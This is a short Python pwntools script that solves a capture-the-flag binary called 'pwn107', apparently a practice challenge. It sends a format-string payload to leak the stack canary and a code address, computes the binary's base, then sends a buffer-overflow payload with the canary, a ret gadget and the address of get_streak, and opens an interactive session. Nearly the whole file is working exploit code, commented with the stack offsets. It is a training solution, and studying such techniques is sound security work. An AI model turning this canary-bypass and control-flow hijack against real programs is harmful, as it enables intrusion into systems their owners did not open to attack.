"""
%13$p.%17$p = canary + leaked address
"""
from pwn import *

context.binary = binary = ELF("./pwn107.pwn107", checksec= False)
context.log_level = "debug"

p = process()
p.recvuntil(b"streak?")
payload = b"%13$p.%17$p"
p.sendline(payload)
p.recvuntil(b"streak:")

output = p.recv().split(b"\n")[0]
canary = int(output.split(b".")[0].strip(), 16)
leaked = int(output.split(b".")[1].strip(), 16)

print(f"Canary value: {hex(canary)}\nLeaked memory address: {hex(leaked)}")

offset = 0x00000a36
binary.address = leaked - offset
print(f"Binary base: {hex(binary.address)}")

"""
Second read writes from rbp-0x20
canary is at rbp-0x8
0x20 - 0x8 = 0x18
"""

get_streak = binary.symbols.get_streak
print(hex(get_streak))
rop = ROP(binary)
ret_gadget = rop.find_gadget(['ret'])[0]
payload = b"A"* 0x18 + p64(canary) + b"B" * 0x8 + p64(ret_gadget) + p64(get_streak)
p.sendline(payload)
p.interactive()